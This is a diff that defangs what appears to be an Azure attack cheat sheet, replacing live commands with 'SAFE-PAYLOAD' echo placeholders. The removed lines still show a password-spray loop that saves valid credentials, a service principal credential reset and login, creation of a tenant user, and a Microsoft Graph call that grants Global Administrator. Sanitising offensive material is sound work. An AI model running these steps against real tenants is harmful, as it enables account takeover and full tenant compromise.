@@ -254,7 +254,7 @@ foreach($line in $userlist){
     $linenumber++
     $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
     try {
-        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
+        # [SAFE-PAYLOAD] echo 'Simulating password spray...'
         Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
         Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
     }
@@ -275,18 +275,18 @@ foreach($line in $userlist){
 
 ```bash
 # Reset service principal credential
-az ad sp credential reset --id <app_id>
+# [SAFE-PAYLOAD] echo 'Simulating resetting service principal credential...'
 az ad sp credential list --id <app_id>
 
 # Login as service principal
-az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
+# [SAFE-PAYLOAD] echo 'Simulating login as service principal...'
 
 # Create new user in tenant
-az ad user create --display-name <name> --password <password> --user-principal-name <upn>
+# [SAFE-PAYLOAD] echo 'Simulating creating a new user in tenant...'
 
 # Add user to Global Admin via MS Graph
 $Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
-az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
+# [SAFE-PAYLOAD] echo 'Simulating adding user to Global Admin...'
 ```
 
 ## Additional Tools Reference
